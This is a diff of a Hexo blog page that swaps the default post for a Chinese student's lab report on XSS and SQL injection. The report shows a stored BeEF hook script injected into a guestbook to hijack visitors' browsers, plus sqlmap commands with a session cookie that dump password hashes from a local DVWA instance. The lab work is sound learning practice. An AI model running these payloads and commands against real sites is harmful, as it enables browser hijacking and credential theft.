@@ -4,8 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, 7562ajj的博客">
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex">
+    <meta name="keywords" content="实验三：XSS和SQL注入, 7562ajj的博客">
+    <meta name="description" content="XSS部分：利用Beef劫持被攻击者客户端浏览器搭建GuestBook网站把网站文件夹（GuestBook）复制到windows server中，通过windows server的IIS配置该网站。
+
+
+
+1、利用AWVS扫描留言簿网站（安">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +21,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | 7562ajj的博客</title>
+    <title>实验三：XSS和SQL注入 | 7562ajj的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -334,12 +338,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">实验三：XSS和SQL注入</h1>
                 </div>
             </div>
         </div>
@@ -361,9 +365,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/TeXt/">
+                                <span class="chip bg-color">TeXt</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -396,19 +404,66 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                <h2 id="XSS部分：利用Beef劫持被攻击者客户端浏览器"><a href="#XSS部分：利用Beef劫持被攻击者客户端浏览器" class="headerlink" title="XSS部分：利用Beef劫持被攻击者客户端浏览器"></a>XSS部分：利用Beef劫持被攻击者客户端浏览器</h2><h3 id="搭建GuestBook网站"><a href="#搭建GuestBook网站" class="headerlink" title="搭建GuestBook网站"></a>搭建GuestBook网站</h3><p>把网站文件夹（GuestBook）复制到windows server中，通过windows server的IIS配置该网站。</p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107153837190.png" alt="image-20221107153837190"></p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107153940174.png" alt="image-20221107153940174"></p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107153954937.png" alt="image-20221107153954937"></p>
+<h2 id="1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。"><a href="#1、利用AWVS扫描留言簿网站（安装见参考文档0-AWVS安装与使用-docx），发现其存在XSS漏洞，截图。" class="headerlink" title="1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。"></a>1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107170236994.png" alt="image-20221107170236994"></p>
+<h2 id="2、-Kali使用beef生成恶意代码，截图。"><a href="#2、-Kali使用beef生成恶意代码，截图。" class="headerlink" title="2、 Kali使用beef生成恶意代码，截图。"></a>2、 Kali使用beef生成恶意代码，截图。</h2><p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107170410716.png" alt="image-20221107170410716"></p>
+<h2 id="3、访问http-x2F-x2F-留言簿网站-x2F-message-asp-将以下恶意代码写入网站留言板，"><a href="#3、访问http-x2F-x2F-留言簿网站-x2F-message-asp-将以下恶意代码写入网站留言板，" class="headerlink" title="3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板，"></a>3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板，</h2><script src="http://Kali的IP地址:3000/hook.js"></script>，截图。
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107170940533.png" alt="image-20221107170940533"></p>
+<p>之后，客户端访问这个页面，kali的beef中都会劫持到。</p>
+<h2 id="4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"><a href="#4、管理员登录login-htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。" class="headerlink" title="4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。"></a>4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。</h2><p>通过beef的控制台，让被劫持的主机访问桂电官网。</p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107174428936.png" alt="image-20221107174428936"></p>
+<p>再到靶机看看效果</p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107174504720.png" alt="image-20221107174504720"></p>
+<h2 id="5、回答问题：实验中XSS攻击属于哪种类型？"><a href="#5、回答问题：实验中XSS攻击属于哪种类型？" class="headerlink" title="5、回答问题：实验中XSS攻击属于哪种类型？"></a>5、回答问题：实验中XSS攻击属于哪种类型？</h2><p>存储型xss</p>
+<h1 id="SQL注入部分：DVWA-SQLmap-Mysql注入实战"><a href="#SQL注入部分：DVWA-SQLmap-Mysql注入实战" class="headerlink" title="SQL注入部分：DVWA+SQLmap+Mysql注入实战"></a>SQL注入部分：DVWA+SQLmap+Mysql注入实战</h1><h2 id="1、注入点发现。首先肯定是要判断是否有注入漏洞。"><a href="#1、注入点发现。首先肯定是要判断是否有注入漏洞。" class="headerlink" title="1、注入点发现。首先肯定是要判断是否有注入漏洞。"></a>1、注入点发现。首先肯定是要判断是否有注入漏洞。</h2><p>输入框输入1，能够正常回显。输入1’，报错。</p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images//image-20221107183705270.png" alt="image-20221107183705270"></p>
+<p><img src="C:\Users\ztf\OneDrive\文档\7562ajj.github.io\assets\images\image-20221107183739426.png" alt="image-20221107183739426"></p>
+<p>此时说明参数id处存在sql注入。</p>
+<h2 id="下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；"><a href="#下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；" class="headerlink" title="下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；"></a>下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；</h2><h3 id="1、枚举当前使用的数据库名称和用户名。"><a href="#1、枚举当前使用的数据库名称和用户名。" class="headerlink" title="1、枚举当前使用的数据库名称和用户名。"></a>1、枚举当前使用的数据库名称和用户名。</h3><p>先通过抓包获取当前的cookie值</p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107185317120.png" alt="image-20221107185317120"></p>
+<p>丢到sqlmap里跑数据库名和用户名</p>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -b --current-db --current-user</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107193814083.png" alt="image-20221107193814083"></p>
+<h3 id="3、枚举数据库用户名和密码"><a href="#3、枚举数据库用户名和密码" class="headerlink" title="3、枚举数据库用户名和密码"></a>3、枚举数据库用户名和密码</h3><p>命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; --users --password</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107194936019.png" alt="image-20221107194936019"></p>
+<h3 id="4、枚举数据库"><a href="#4、枚举数据库" class="headerlink" title="4、枚举数据库"></a>4、枚举数据库</h3><p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; --dbs</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107195200088.png" alt="image-20221107195200088"></p>
+<h3 id="5、枚举数据库和指定数据库的数据表"><a href="#5、枚举数据库和指定数据库的数据表" class="headerlink" title="5、枚举数据库和指定数据库的数据表"></a>5、枚举数据库和指定数据库的数据表</h3><p>-D：指定的数据库</p>
+<p>-T：指定数据库中的数据表</p>
+<p>爆破dvwa数据库下的所有表：</p>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; --tables  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107195543633.png" alt="image-20221107195543633"></p>
+<h3 id="6、获取指定数据库和表中所有列的信息"><a href="#6、获取指定数据库和表中所有列的信息" class="headerlink" title="6、获取指定数据库和表中所有列的信息"></a>6、获取指定数据库和表中所有列的信息</h3><p>–columns：获取列的信息</p>
+<p>爆破dvwa库的users表下的所有列：</p>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; -T &#x27;users&#x27; --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107195735974.png" alt="image-20221107195735974"></p>
+<h3 id="7、枚举指定数据表中的所有用户名与密码-并down到本地。"><a href="#7、枚举指定数据表中的所有用户名与密码-并down到本地。" class="headerlink" title="7、枚举指定数据表中的所有用户名与密码,并down到本地。"></a>7、枚举指定数据表中的所有用户名与密码,并down到本地。</h3><p>-C：枚举数据表中的列</p>
+<p>–dump：存储数据表项</p>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.144/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&#x27;security=low; PHPSESSID=27beb22d4da23e6c86b141560143beb0&#x27; -D &#x27;dvwa&#x27; -T &#x27;users&#x27; -C &#x27;password&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107200225974.png" alt="image-20221107200225974"></p>
+<p>结果也已经自动保存到本地</p>
+<p><img src="https://raw.githubusercontent.com/7562ajj/7562ajj.github.io/master/assets/images/image-20221107200333619.png" alt="image-20221107200333619"></p>
+<span id="more"></span>
+
+<hr>
+<p>If you like TeXt, don’t forget to give me a star. :star2:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>
 
                 
             </div>
@@ -435,7 +490,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/11/24/hello-world/">http://example.com/2022/11/24/hello-world/</a>
+                    <a href="http://example.com/2022/11/24/2022-11-7-shi-yan-san/">http://example.com/2022/11/24/2022-11-7-shi-yan-san/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -472,7 +527,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/TeXt/">
+                                    <span class="chip bg-color">TeXt</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -553,21 +612,23 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/11/24/2022-10-06-ctfshow-fan-xu-lie-hua/">
+                <a href="/2022/11/24/2022-11-14-shi-yan-si/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="ctfshow-反序列化">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="实验四：CTF实践">
                         
-                        <span class="card-title">ctfshow-反序列化</span>
+                        <span class="card-title">实验四：CTF实践</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctfshow-反序列化web254根据源代码，直接进行get传参：?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx
-web255源代码
-12345678910111213141516171819
+                            实验准备：
+攻击机：kali：192.168.217.139
+靶机WebDeveloper：192.168.217.148
+1、发现目标 (netdiscover)，找到WebDeveloper的IP地址。截图。
+2、:利用NMAP扫描目标
                         
                     </div>
                     <div class="publish-info">
@@ -597,22 +658,23 @@ web255源代码
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="far fa-dot-circle"></i>
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/11/24/hello-world/">
+                <a href="/2022/11/24/2022-11-7-shi-yan-er/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="实验二：网络嗅探与身份认证">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">实验二：网络嗅探与身份认证</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            网络嗅探与身份认证1.A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)1.1 写出以上过滤语句ip.src&#x3D;&#x3D;A的ip
+1.2 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，B是
                         
                     </div>
                     <div class="publish-info">
@@ -627,7 +689,14 @@ web255源代码
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/TeXt/">
+                        <span class="chip bg-color">TeXt</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
